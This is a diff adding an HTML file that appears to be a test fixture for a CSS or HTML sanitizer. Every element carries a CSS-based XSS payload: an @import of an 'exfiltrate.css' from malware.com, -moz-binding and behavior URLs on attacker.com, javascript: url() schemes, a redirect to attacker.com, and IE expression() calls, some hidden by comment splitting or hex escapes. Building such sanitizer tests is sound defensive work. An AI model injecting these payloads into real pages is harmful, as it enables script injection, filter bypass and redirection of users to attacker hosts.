@@ -1,0 +1,33 @@
+<style>
+    /* Malicious CSS directives in style tags */
+    @import url("http://malware.com/exfiltrate.css");
+    
+    div.exploit-container {
+        color: red;
+        -moz-binding: url('http://attacker.com/xbl.xml#exploit');
+        behavior: url('http://attacker.com/exploit.htc');
+        background-image: url("javascript:alert('CSS url() XSS')");
+    }
+</style>
+<div class="exploit-container">
+    <h1>CSS-Based Attack Vectors</h1>
+    <!-- Dynamic expression evaluation in inline styles -->
+    <div style="width: expression(alert('IE CSS expression')); height: 100px;">
+        IE Expression Test
+    </div>
+
+    <!-- Comment-obfuscated expression -->
+    <div style="background: exp/* comment */ression(alert('Obfuscated Expression'));">
+        Comment Obfuscation Test
+    </div>
+
+    <!-- Hex-escaped identifier -->
+    <p style="font-size: \65xpression(document.body.innerHTML='Hacked');">
+        Hex Escape Obfuscation Test
+    </p>
+
+    <!-- Inline dangerous url() scheme -->
+    <span style="background: url('javascript:void(window.location=\'http://attacker.com\')');">
+        Inline URL Scheme Test
+    </span>
+</div>
